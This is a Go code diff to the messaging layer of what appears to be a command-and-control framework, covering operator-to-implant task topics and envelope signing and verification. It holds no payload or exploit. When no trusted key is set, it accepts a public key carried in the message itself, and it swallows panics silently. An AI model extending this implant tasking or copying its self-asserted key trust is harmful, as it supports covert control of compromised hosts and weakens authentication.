@@ -88,6 +88,15 @@ func (m *Messenger) TaskTopic(implantPeerID string) string {
 	return BeaconTopicPrefix + m.operatorID.String() + TasksSuffix + implantPeerID
 }
 
+func EnvelopeSigningBytes(env *apb.Envelope) ([]byte, error) {
+	signingEnv := &apb.Envelope{
+		ID:   env.ID,
+		Type: env.Type,
+		Data: env.Data,
+	}
+	return proto.Marshal(signingEnv)
+}
+
 func VerifyEnvelope(env *apb.Envelope, trustedPub crypto.PubKey) error {
 	if trustedPub == nil {
 		return fmt.Errorf("no trusted public key configured")
@@ -95,7 +104,11 @@ func VerifyEnvelope(env *apb.Envelope, trustedPub crypto.PubKey) error {
 	if len(env.Signature) == 0 {
 		return fmt.Errorf("%w: missing signature", ErrSignatureInvalid)
 	}
-	ok, err := cryptography.Verify(trustedPub, env.Data, env.Signature)
+	signingData, err := EnvelopeSigningBytes(env)
+	if err != nil {
+		return fmt.Errorf("marshal signing data: %w", err)
+	}
+	ok, err := cryptography.Verify(trustedPub, signingData, env.Signature)
 	if err != nil {
 		return fmt.Errorf("verify: %w", err)
 	}
@@ -118,6 +131,10 @@ func (m *Messenger) listenVerified(ctx context.Context, topic string, getTrusted
 		return fmt.Errorf("subscribe %s: %w", topic, err)
 	}
 	go func() {
+		defer sub.Cancel()
+		defer func() {
+			recover()
+		}()
 		for {
 			msg, err := sub.Next(ctx)
 			if err != nil {
@@ -130,14 +147,22 @@ func (m *Messenger) listenVerified(ctx context.Context, topic string, getTrusted
 
 			trusted := getTrusted()
 			if trusted == nil {
-				m.deliver(ctx, env)
-				continue
+				trusted, err = PubKeyFromEnvelope(env)
+				if err != nil {
+					continue
+				}
+				senderID, idErr := peer.IDFromPublicKey(trusted)
+				if idErr == nil {
+					if stored := m.KnownImplant(senderID.String()); stored != nil {
+						trusted = stored
+					}
+				}
 			}
 
 			if err := VerifyEnvelope(env, trusted); err != nil {
 				continue
 			}
-			m.deliver(ctx, env)
+			go m.deliver(ctx, env)
 		}
 	}()
 	return nil
@@ -166,6 +191,9 @@ func (m *Messenger) ListenTask(ctx context.Context, implantPeerID string) error 
 }
 
 func (m *Messenger) deliver(ctx context.Context, env *apb.Envelope) {
+	defer func() {
+		recover()
+	}()
 	m.mu.RLock()
 	handler := m.handler
 	m.mu.RUnlock()
@@ -191,7 +219,11 @@ func (m *Messenger) SignAndSend(ctx context.Context, topic string, env *apb.Enve
 	if m.privKey == nil {
 		return fmt.Errorf("no private key for signing")
 	}
-	sig, err := m.privKey.Sign(env.Data)
+	signingData, err := EnvelopeSigningBytes(env)
+	if err != nil {
+		return fmt.Errorf("marshal signing data: %w", err)
+	}
+	sig, err := m.privKey.Sign(signingData)
 	if err != nil {
 		return fmt.Errorf("sign: %w", err)
 	}
